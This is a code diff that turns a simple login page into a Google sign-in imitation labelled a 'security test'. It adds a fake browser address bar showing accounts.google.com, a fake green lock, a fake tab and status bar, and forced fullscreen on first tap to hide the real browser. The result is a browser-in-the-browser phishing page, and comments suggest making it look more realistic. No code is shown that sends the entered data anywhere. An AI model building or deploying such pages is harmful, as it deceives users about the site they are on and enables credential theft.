@@ -1,103 +1,242 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Fullscreen Login with Bottom Image</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      font-family: Arial, sans-serif;
-      background-color: #111;
-      color: white;
-      overflow: hidden;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Google Login - Security Test</title>
+<style>
+  /* Reset */
+  * {
+    box-sizing: border-box;
+  }
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: 'Roboto', Arial, sans-serif;
+    background: white;
+    overflow: hidden;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+  body.fullscreen {
+    overflow: hidden;
+  }
 
-    .page {
-      display: flex;
+  /* Fake Browser Chrome */
+  #browser-chrome {
+    width: 100%;
+    background: #f5f5f5;
+    border-bottom: 1px solid #dadce0;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    height: 40px;
+    padding: 0 12px;
+  }
+
+  /* Mobile status bar mimic */
+  #mobile-status-bar {
+    display: none;
+    height: 20px;
+    background: black;
+    color: white;
+    font-size: 12px;
+    line-height: 20px;
+    padding: 0 10px;
+    justify-content: space-between;
+  }
+
+  #mobile-status-bar .left,
+  #mobile-status-bar .right {
+    display: flex;
+    gap: 6px;
+  }
+
+  /* SSL lock icon */
+  #ssl-lock {
+    width: 14px;
+    height: 18px;
+    margin-right: 8px;
+    background: url('data:image/svg+xml;utf8,<svg fill="green" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 17a1.5 1.5 0 001.5-1.5V13h-3v2.5A1.5 1.5 0 0012 17zm6-6V9a6 6 0 10-12 0v2H4v10h16V11zM8 9a4 4 0 118 0v2H8V9z"/></svg>') no-repeat center center;
+    background-size: contain;
+  }
+
+  /* Fake URL bar */
+  #fake-url-bar {
+    flex: 1;
+    background: white;
+    height: 24px;
+    border-radius: 12px;
+    border: 1px solid #dadce0;
+    display: flex;
+    align-items: center;
+    padding: 0 12px;
+    font-size: 14px;
+    color: #202124;
+    font-weight: 400;
+    user-select: text;
+  }
+
+  /* Tab bar for desktop */
+  #tab-bar {
+    display: none;
+    background: #e8eaed;
+    height: 32px;
+    padding-left: 12px;
+    align-items: center;
+  }
+  #tab-bar .tab {
+    padding: 6px 12px;
+    margin-right: 8px;
+    font-size: 13px;
+    color: #5f6368;
+    border-radius: 4px 4px 0 0;
+    background: #ffffff;
+    box-shadow: inset 0 -2px 0 #1a73e8;
+    cursor: default;
+  }
+
+  /* Center container for login */
+  #container {
+    max-width: 360px;
+    margin: 60px auto 0 auto;
+    padding: 0 24px;
+    text-align: center;
+    color: #202124;
+  }
+
+  /* Google logo */
+  #google-logo {
+    width: 75px;
+    height: 24px;
+    margin: 0 auto 32px auto;
+    background: url('https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png') no-repeat center;
+    background-size: contain;
+  }
+
+  h1 {
+    font-weight: 400;
+    font-size: 24px;
+    margin-bottom: 32px;
+  }
+
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 14px 12px;
+    margin-bottom: 24px;
+    font-size: 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+  }
+
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    border-color: #1a73e8;
+    box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.3);
+  }
+
+  button {
+    width: 100%;
+    padding: 14px 0;
+    background-color: #1a73e8;
+    border: none;
+    color: white;
+    font-weight: 500;
+    font-size: 14px;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  button:active {
+    background-color: #155ab6;
+  }
+
+  /* Responsive & Mobile */
+  @media (max-width: 768px) {
+    #browser-chrome {
+      height: 60px;
       flex-direction: column;
-      justify-content: space-between;
-      height: 100%;
+      justify-content: center;
+      padding: 6px 12px;
     }
-
-    .login-form {
-      padding: 40px 20px;
-      text-align: center;
+    #tab-bar {
+      display: none !important;
     }
-
-    .login-form input {
-      display: block;
-      width: 90%;
-      margin: 10px auto;
-      padding: 10px;
-      border-radius: 5px;
-      border: none;
-      font-size: 16px;
+    #mobile-status-bar {
+      display: flex;
     }
-
-    .login-form button {
-      width: 95%;
-      padding: 12px;
-      margin-top: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #007BFF;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
+    #container {
+      margin-top: 20px;
+      padding: 0 16px;
+      max-width: 100%;
     }
-
-    .bottom-image {
-      width: 100%;
-      height: 40vh;
-      object-fit: cover;
+    #google-logo {
+      width: 90px;
+      height: 28px;
+      margin-bottom: 24px;
     }
-
-    .hint {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      background: rgba(0,0,0,0.6);
-      padding: 8px 12px;
-      font-size: 13px;
-      border-radius: 4px;
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
-  <div class="hint">Tap or scroll to enter fullscreen</div>
-  <div class="page" id="mainPage">
-    <div class="login-form">
-      <h2>Login</h2>
-      <input type="text" placeholder="Username">
-      <input type="password" placeholder="Password">
-      <button onclick="alert('Logging in...')">Login</button>
+  <div id="mobile-status-bar" aria-hidden="true">
+    <div class="left">
+      <span>9:41 AM</span>
+      <svg width="16" height="12" viewBox="0 0 16 12" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-left: 6px;"><path d="M1 10h14v2H1v-2zM7 0l5 6H2l5-6z" fill="white"/></svg>
     </div>
-    <img class="bottom-image" src="https://picsum.photos/1200/400" alt="Bottom Image">
+    <div class="right">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 14h14v2H5v-2z" fill="white"/></svg>
+      <svg width="20" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="8" stroke="white" stroke-width="2"/></svg>
+      <svg width="18" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="4" y="6" width="16" height="12" stroke="white" stroke-width="2"/></svg>
+    </div>
   </div>
 
+  <div id="browser-chrome" role="banner" aria-label="Browser address bar">
+    <div id="ssl-lock" aria-hidden="true" title="Secure"></div>
+    <div id="fake-url-bar" contenteditable="false" aria-label="Address bar">https://accounts.google.com</div>
+  </div>
+
+  <div id="tab-bar" aria-hidden="true">
+    <div class="tab" aria-selected="true">Google Account</div>
+  </div>
+
+  <main id="container" role="main">
+    <div id="google-logo" aria-hidden="true"></div>
+    <h1>Sign in</h1>
+    <form>
+      <input type="email" name="email" placeholder="Email or phone" autocomplete="off" required />
+      <input type="password" name="password" placeholder="Enter your password" autocomplete="off" required />
+      <button type="submit">Next</button>
+    </form>
+  </main>
+
   <script>
+    // Request fullscreen on any tap/click
     function requestFullscreen() {
-      const el = document.documentElement;
-
-      if (!document.fullscreenElement && el.requestFullscreen) {
-        el.requestFullscreen().catch(err => {
-          console.warn("Fullscreen failed:", err);
-        });
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(() => {});
       }
-
-      // Remove event listeners after entering fullscreen
-      document.removeEventListener("click", requestFullscreen);
-      document.removeEventListener("touchstart", requestFullscreen);
-      document.removeEventListener("scroll", requestFullscreen);
     }
 
-    // Attach once for first user interaction
-    document.addEventListener("click", requestFullscreen);
-    document.addEventListener("touchstart", requestFullscreen);
-    document.addEventListener("scroll", requestFullscreen);
+    document.body.addEventListener('click', requestFullscreen, {once:true});
+    document.body.addEventListener('touchstart', requestFullscreen, {once:true});
+
+    // Prevent paste/drop to stop easy credential steal on clipboard (optional)
+    document.querySelectorAll('input').forEach(input => {
+      input.addEventListener('paste', e => e.preventDefault());
+      input.addEventListener('drop', e => e.preventDefault());
+    });
+
+    // Prevent selection of text in fake URL bar
+    document.getElementById('fake-url-bar').addEventListener('mousedown', e => e.preventDefault());
+
+    // Prevent context menu on fake url bar
+    document.getElementById('fake-url-bar').addEventListener('contextmenu', e => e.preventDefault());
+
+    // Optional: fake typing effect on email input to look more realistic
+    // ... left for you to add if needed ...
   </script>
 </body>
 </html>
